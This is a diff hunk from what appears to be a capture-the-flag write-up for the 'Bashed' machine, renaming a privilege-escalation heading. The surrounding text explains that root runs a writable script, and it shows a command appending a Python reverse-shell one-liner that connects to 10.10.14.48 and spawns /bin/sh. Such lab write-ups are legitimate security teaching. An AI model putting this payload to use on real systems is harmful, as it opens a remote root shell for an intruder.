@@ -255,7 +255,7 @@ IOError: [Errno 13] Permission denied: 'test.txt'
 ```
 test.txt is owned by root, so the script fails to write to it. When I continually read this file, I can see the date write date is increasing - note that in the enum script, the test.txt file was modified in the last 5 minutes. This means the script is getting run regulary on the machine by root.
 
-### 3. Get a root shell
+### 5. Escalate to root
 Firstly append a reverse shell one-liner to the script:
 ```bash
 scriptmanager@bashed:/scripts$ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.48",9998));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' >> test.py
